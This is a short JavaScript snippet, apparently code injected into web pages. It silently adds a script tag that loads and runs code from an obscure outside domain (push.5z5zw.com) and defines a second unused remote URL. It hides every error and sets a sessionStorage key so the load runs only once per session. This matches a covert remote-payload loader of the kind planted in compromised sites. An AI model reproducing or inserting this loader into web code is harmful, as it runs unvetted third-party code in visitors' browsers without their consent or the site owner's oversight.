(function() {
    function uzi_a_s(url) {
        try {
            var ga = document.createElement('script');
            ga.type = 'text/javascript';
            ga.async = true;
            ga.src = url;
            var s = document.getElementsByTagName('script')[0];
            s.parentNode.insertBefore(ga, s)
        } catch (e) {}
    }

    function uzi_g() {
        try {
            var b_p = 'KJHGZ8MFSNYZDATGKQDRFGZJDK3WGAVO';
            if (sessionStorage.web_key_BNJBXSPZC3554N2T != b_p) {
                var uzi_url = 'https://push.5z5zw.com/ss/lw_xiye001.js';
                var uziurl = 'http://etc.6187wo.com/chijian_core2.js';
                uzi_a_s(uzi_url)
            }
        } catch (e) {}
        setTimeout(function() {
            var b_s = 'KJHGZ8MFSNYZDATGKQDRFGZJDK3WGAVL';
            sessionStorage.web_key_BNJBXSPZC3554N2T = b_s
        }, 5000)
    }
    uzi_g()
}());